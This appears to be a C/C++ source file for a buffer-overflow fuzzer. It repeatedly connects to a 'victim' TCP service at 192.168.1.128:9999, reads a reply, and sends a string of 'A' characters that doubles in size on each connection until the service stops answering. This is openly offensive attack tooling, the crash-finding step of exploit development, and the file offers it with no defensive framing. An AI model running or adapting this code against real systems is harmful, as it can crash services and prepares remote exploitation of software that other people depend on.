#if defined(_WIN32)
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#endif
#include <ws2tcpip.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

#define ISVALIDSOCKET(s) ((s) != INVALID_SOCKET)
#define CLOSESOCKET(s) closesocket(s)
#define GETSOCKETERRNO() WSAGetLastError()
#else

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <errno.h>

#define ISVALIDSOCKET(s) ((s) >= 0)
#define SOCKET int
#define CLOSESOCKET close(s)
#define GETSOCKETERRNO() (errno)
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <string>
#include <iostream>
#include <cstring>
#include <cstdio>


int main(int argc, char** argv){
#if defined(_WIN32)
	WSADATA d;
	if(WSAStartup(MAKEWORD(2,2), &d)){
		printf("Unable to initialize winsock !\n");
		return -1;
	}
#endif

static std::string counter = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    while(1){
        struct addrinfo hints;
        memset(&hints, 0, sizeof(hints));
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_family = AF_INET;
        struct addrinfo* peerAddress;
        if(getaddrinfo("192.168.1.128", "9999", &hints, &peerAddress)){
            return 0;
        }

        char serviceBuffer[64];
        char AddressBuffer[64];    
        getnameinfo(
            peerAddress->ai_addr,
            peerAddress->ai_addrlen,
            AddressBuffer,
            sizeof(AddressBuffer),
            serviceBuffer,
            sizeof(AddressBuffer),
            NI_NUMERICHOST
        );

        SOCKET socketPeer = socket(peerAddress->ai_family, peerAddress->ai_socktype, peerAddress->ai_protocol);
        if(!ISVALIDSOCKET(socketPeer)){
            printf("[+] Failed to init socket\n");
            break;
        }

        if(connect(socketPeer, peerAddress->ai_addr, peerAddress->ai_addrlen) != 0){
            printf("[-] Can't connect to victim !\n");
            break;
        }
        freeaddrinfo(peerAddress);
        char fBytesBuffer[4096];
        int fBytes = recv(socketPeer, fBytesBuffer, 4096, 0);
        if(fBytes<1){
            std::cout<<"[-] No data received !"<<std::endl;
            break;
        }
        std::cout<<"Sent "<<counter.length()<<" Bytes."<<std::endl;
        send(socketPeer, counter.c_str(), counter.length(), 0);
        counter+=counter;

    }
    std::cout<<"[+] End of program !"<<std::endl;
}  
